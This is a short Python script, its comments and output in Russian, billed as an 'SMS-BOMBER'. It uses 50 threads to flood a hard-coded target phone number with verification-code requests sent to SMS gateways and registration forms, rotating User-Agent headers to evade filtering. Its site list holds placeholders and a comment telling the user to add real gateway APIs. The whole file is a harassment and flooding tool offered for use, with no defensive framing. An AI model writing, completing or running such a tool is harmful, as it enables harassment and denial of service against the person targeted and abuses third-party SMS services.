#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import threading
import time
import random
import string

# === КОНФИГУРАЦИЯ ===
TARGET_PHONE = "+79968359148"  # ИЗМЕНИТЬ НА ЦЕЛЕВОЙ НОМЕР
THREADS = 50                   # КОЛИЧЕСТВО ПОТОКОВ
DURATION = 60                  # СЕКУНД РАБОТЫ
DELAY = 0.1                    # ЗАДЕРЖКА МЕЖДУ ЗАПРОСАМИ

# === БАЗА САЙТОВ ДЛЯ SMS-РАССЫЛКИ ===
SITES = [
    {"url": "https://example.com/api/send", "payload": {"phone": "phone", "message": "code"}},
    {"url": "https://test.com/register", "payload": {"mobile": "phone"}},
    # ДОБАВИТЬ РЕАЛЬНЫЕ API ШЛЮЗОВ И ФОРМ РЕГИСТРАЦИИ
]

# === ФУНКЦИЯ ОТПРАВКИ ===
def send_sms(site, phone):
    try:
        payload = {}
        for key, val in site["payload"].items():
            if val == "phone":
                payload[key] = phone
            else:
                payload[key] = ''.join(random.choices(string.digits, k=6))
        
        headers = {
            "User-Agent": random.choice(["Mozilla/5.0", "Chrome/91.0", "Safari/537.36"])
        }
        
        response = requests.post(site["url"], data=payload, headers=headers, timeout=5)
        return response.status_code == 200
    except:
        return False

# === ФЛУД-ФУНКЦИЯ ===
def flood_worker():
    end_time = time.time() + DURATION
    while time.time() < end_time:
        site = random.choice(SITES)
        send_sms(site, TARGET_PHONE)
        time.sleep(DELAY)

# === ЗАПУСК ===
print(f"TWEAKOS :: SMS-BOMBER АКТИВИРОВАН")
print(f"Цель: {TARGET_PHONE}")
print(f"Потоков: {THREADS} | Длительность: {DURATION} сек")
print("="*50)

threads = []
for _ in range(THREADS):
    t = threading.Thread(target=flood_worker)
    t.daemon = True
    t.start()
    threads.append(t)

time.sleep(DURATION)
print("="*50)
print("TWEAKOS :: АТАКА ЗАВЕРШЕНА")
